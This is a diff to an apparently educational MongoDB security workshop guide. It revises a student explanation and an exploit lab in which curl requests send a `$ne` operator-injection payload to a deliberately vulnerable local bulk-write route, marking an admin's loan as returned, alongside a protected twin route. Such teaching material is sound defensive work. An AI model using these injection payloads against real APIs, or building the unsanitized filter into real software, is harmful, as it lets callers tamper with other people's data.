@@ -57,7 +57,7 @@ The routes use the native `mongodb` driver against [mongodb-memory-server](https
 <a id="mongo-039-student"></a>
 ### Student guide
 
-A bulk write is a list of operations, and each operation has its own filter. The fixed `$set: {state: 'in'}` in this route controls *what* changes, which reads like a control — but `item.where` controls *which rows*, and it is the caller's object, taken as it arrives. One request marks every loan in the ledger as returned. The twin destructures named fields, names the fixed borrower in the filter, and reduces the number to an element of `$in`.
+A bulk write is a list of operations, and each operation has its own filter. The fixed `$set: {state: 'in'}` in this route controls *what* changes, which reads like a control — but `item.where` controls *which rows*, and it is the caller's object, taken as it arrives. One crafted `where` — a `$ne` that excludes only the caller's own loan — marks another person's loan as returned. The twin destructures named fields, names the fixed borrower in the filter, and reduces the number to an element of `$in`.
 
 <a id="mongo-039-exploit"></a>
 ### Exploit lab
@@ -72,15 +72,21 @@ Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same i
 
 ```bash
 curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/batch -H 'Content-Type: application/json' \
-  -d '{"items":[{"where":{"number":{"$gt":0}}}]}'
-# {"changed":2} — both loans, including admin's
+  -d '{"items":[{"where":{"number":{"$ne":101}}}]}'
+# {"changed":1}
 
 curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/bundle -H 'Content-Type: application/json' \
-  -d '{"items":[{"where":{"number":{"$gt":0}}}]}'
+  -d '{"items":[{"where":{"number":{"$ne":101}}}]}'
 # {"changed":0} — the where key is never read
+
+# Read the effect back: the caller's own loan is untouched, so the row that
+# changed is loan 202, the admin loan.
+curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/batch -H 'Content-Type: application/json' \
+  -d '{"items":[{"where":{"number":101}}]}'
+# {"changed":1} — loan 101 was still out, so the attack changed 202
 ```
 
-**Observation that proves exploitation:** `changed: 2` — the caller changed another person's loan, which the ordinary input (one loan) can never do.
+**Observation that proves exploitation:** the attack reports `changed: 1` for a filter that cannot match the caller's own loan, and the read-back shows loan 101 untouched — the changed row is 202, the admin loan, which the ordinary input can never name.
 
 <a id="mongo-039-safe"></a>
 ### Vulnerable vs protected — and why
